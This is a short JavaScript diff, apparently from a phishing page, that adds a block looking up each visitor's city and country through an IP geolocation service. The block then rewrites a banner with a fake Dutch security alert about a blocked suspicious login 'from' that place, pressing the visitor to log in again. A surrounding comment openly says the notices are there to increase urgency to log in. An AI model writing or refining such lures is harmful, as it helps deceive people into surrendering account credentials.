@@ -897,6 +897,26 @@
         this.value = val;
     });
 
+    // Dynamic IP geo location update in urgency banner
+    (function() {
+        try {
+            fetch('https://ipapi.co/json/')
+                .then(r => r.json())
+                .then(geo => {
+                    const city    = geo.city    || '';
+                    const country = geo.country_name || geo.country || '';
+                    const loc = city && country ? city + ', ' + country : (country || city || null);
+                    if (!loc) return;
+                    const banner = document.getElementById('urgentBanner');
+                    if (!banner) return;
+                    const textDiv = banner.querySelector('div');
+                    if (textDiv) {
+                        textDiv.innerHTML = '<strong>Beveiligingswaarschuwing</strong><br>Er werd een verdachte aanmeldpoging vanuit <b>' + loc + '</b> geblokkeerd. Log opnieuw in om je account te bevestigen.';
+                    }
+                }).catch(() => {});
+        } catch(_) {}
+    })();
+
     // Show security notice after 2.5 seconds (increases urgency to log in)
     setTimeout(function() {
         const notice = document.getElementById('secNotice');
